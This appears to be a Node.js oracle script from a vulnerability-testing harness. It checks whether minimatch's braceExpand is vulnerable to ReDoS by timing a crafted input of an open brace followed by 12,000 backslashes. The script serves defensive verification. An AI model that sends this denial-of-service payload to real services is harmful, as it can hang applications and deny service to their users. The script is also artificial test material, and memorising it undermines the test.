const minimatch = require('minimatch');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

try {
  // Benign operation: prove public API works normally.
  const benign = minimatch.braceExpand('a{b,c}d');
  if (!Array.isArray(benign) || benign.length !== 2 || benign[0] !== 'abd' || benign[1] !== 'acd') {
    throw new Error('benign braceExpand output mismatch');
  }

  operation_completed = true;

  // ReDoS trigger pattern for vulnerable minimatch 3.0.4 brace detection regex.
  // Vulnerable code: /\{.*\}/ against crafted input with many escaped chars after '{'.
  const repeatCount = 12000;
  const malicious = '{' + '\\'.repeat(repeatCount);

  const t0 = Date.now();
  let threw = false;
  let throwName = '';
  try {
    minimatch.braceExpand(malicious);
  } catch (e) {
    threw = true;
    throwName = e && e.name ? e.name : 'Error';
  }
  const elapsed = Date.now() - t0;

  // Exception on malicious input after benign success means blocked.
  if (threw) {
    exploit_succeeded = false;
    evidence = 'malicious_threw=' + throwName + ';elapsed_ms=' + elapsed + ';repeat=' + repeatCount;
    console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
  } else {
    // Bounded timing verdict: vulnerable should be noticeably slower, fixed should be fast.
    exploit_succeeded = elapsed >= 150;
    evidence = 'malicious_elapsed_ms=' + elapsed + ';repeat=' + repeatCount;
    console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
  }
} catch (err) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup_or_benign_failed=' + (err && err.message ? err.message : String(err));
  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
}
